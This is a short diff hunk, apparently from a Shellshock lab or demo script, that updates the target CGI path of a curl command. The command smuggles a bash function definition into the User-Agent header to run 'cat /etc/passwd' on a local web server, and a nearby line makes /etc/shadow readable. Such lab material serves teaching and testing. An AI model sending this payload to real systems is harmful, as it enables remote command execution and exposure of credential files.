@@ -15,7 +15,7 @@ docker exec -it web-server bash
 chmod +r /etc/shadow
 
 
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://127.0.0.1:8080/cgi-bin/demo.cgi
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://127.0.0.1:8080/cgi-bin/info
 
 
 
